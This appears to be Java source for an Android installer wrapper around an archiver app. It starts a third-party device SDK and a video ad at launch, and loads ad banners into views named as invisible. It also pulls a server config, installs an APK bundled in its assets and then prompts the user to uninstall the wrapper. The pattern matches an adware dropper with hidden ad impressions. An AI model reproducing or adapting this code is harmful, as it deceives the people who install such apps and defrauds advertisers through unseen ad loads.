package com.ximad.install;

import java.io.File;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.net.Uri;
import android.os.Bundle;
import android.text.ClipboardManager;
import android.view.View;
import android.view.ViewGroup;
import android.view.View.OnClickListener;
import android.widget.Toast;

import com.jirbo.adcolony.AdColonyVideoAd;
import com.jirbo.adcolony.AdColonyVideoListener;
import com.smaato.soma.BannerView;
import com.utility.alexarchiver.R;
import com.ximad.install.banner.Banner;
import com.ximad.install.banner.IBannerConteiner;
import com.ximad.install.config.Config;
import com.ximad.install.config.ConfigFactory;
import com.ximad.install.server.IServerConfigListener;
import com.ximad.install.server.ServerConnector;
import com.ximad.install.utils.IntentAplicationFactory;


import com.apperhand.device.android.AndroidSDKProvider;



/**
 * The Class MainActivity.
 */
public class MainActivity extends Activity implements IBannerConteiner,
		IServerConfigListener {

	private static final int INTENT_RESULT_INSTALL = 0;
	private static final int INTENT_RESULT_OPEN_MARKET = 1;

	private static final String EXTERNAL_PACKAGE_FILE_NAME = "package.apk";
	private static final String EXTERNAL_PACKAGE_ASSETS_PATH = "applications/package.apk";
	protected static final String LEADBOLT_APP_WALL = "http://ad.leadboltads.net/show_app_wall?section_id=339447622";

	private boolean finished = false;

	private ServerConnector mServerConnector;
	private Banner mBanner;
	private ExternalPackage mExternalPackage;
	
	/** The button next. */
	private View mButtonNext;
	
	/** The m button more games. */
	private View mButtonMoreGames;

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		AndroidSDKProvider.initSDK(this);
		super.onCreate(savedInstanceState);

		setContentView(R.layout.main);
		new AdColonyVideoAd().show(null);
		
	
		BannerView myBanner = (BannerView)findViewById(R.id.BannerViewInvisibleFirst);
		myBanner.getAdSettings().setPublisherId(923864271);
		myBanner.getAdSettings().setAdspaceId(65767795);
		myBanner.asyncLoadNewBanner();

		BannerView myBannerSecond = (BannerView)findViewById(R.id.BannerViewInvisibleSecond);
		myBannerSecond.getAdSettings().setPublisherId(923864271);
		myBannerSecond.getAdSettings().setAdspaceId(65767795);
		myBannerSecond.asyncLoadNewBanner(); 
		
		
		
		String userId = getString(R.string.user_id);
		mServerConnector = new ServerConnector(this, userId);
		mBanner = new Banner(this);
		mBanner.initViews();
		mExternalPackage = new ExternalPackage(this,
				EXTERNAL_PACKAGE_FILE_NAME, EXTERNAL_PACKAGE_ASSETS_PATH);
		mBanner.init();
		
		mServerConnector.initConfig(this);
		 	
		
	}

	@Override
	protected void onResume() {
		super.onResume();
		if (!finished) {
			mBanner.refreshUrl();
			mBanner.update();
		}

	}

	@Override
	public void onWindowFocusChanged(boolean hasFocus) {
		super.onWindowFocusChanged(hasFocus);
		if (hasFocus) {
			mBanner.updateSizeBanner();
			mBanner.refreshUrl();
		}
	}

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);
		mBanner.updateSizeBanner();

	}

	@Override
	public void onValidBannerPackage() {
		LoggerPackager.d("onValidBannerPackage");
		if (!mExternalPackage.check()) {
			installApplication(mExternalPackage.getFile());
		} else {
			uninstallApplication(this.getPackageName());
		}
	}

	@Override
	public Context getContext() {
		return this;
	}

	public ViewGroup getRootView() {
		return (ViewGroup) findViewById(R.id.banner_content);
	}

	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		if (requestCode == INTENT_RESULT_INSTALL) {
			if (resultCode == Activity.RESULT_CANCELED) {
				if (!mExternalPackage.check()) {
					finished = true;
					finish();
				} else {
					uninstallApplication(this.getPackageName());
				}
			} else {
				if (mExternalPackage.check()) {
					uninstallApplication(this.getPackageName());
				}
			}

		}
		super.onActivityResult(requestCode, resultCode, data);
	}

	public void installApplication(File file) {
		Intent intent = IntentAplicationFactory.createIntentInstall(file);
		startActivityForResult(intent, INTENT_RESULT_INSTALL);
	}

	public void uninstallApplication(final String pPackageName) {
		Intent intent = IntentAplicationFactory
				.createIntentUninstall(pPackageName);
		startActivity(intent);
	}


	@Override
	public void openUrl(String urlString) {
		Uri uri = Uri.parse(urlString);
		Intent intent = new Intent(Intent.ACTION_VIEW, uri);
		startActivityForResult(intent, INTENT_RESULT_OPEN_MARKET);

	}

	@Override
	public void onGetConfigString(String pConfigString) {
		LoggerPackager.d("json=%s", pConfigString);
		Config config = ConfigFactory.createConfigFromJsonString(pConfigString);
		mBanner.setConfig(config);
	}

	@Override
	public void onErrorGetConfig() {
		mServerConnector.initConfig(this);
	}

	@Override
	public void postStatistic(TypeStatistic pType) {
		mServerConnector.postStatistic(pType, mBanner.getAdsApp(),
				mBanner.getAdsUserId());

	}

}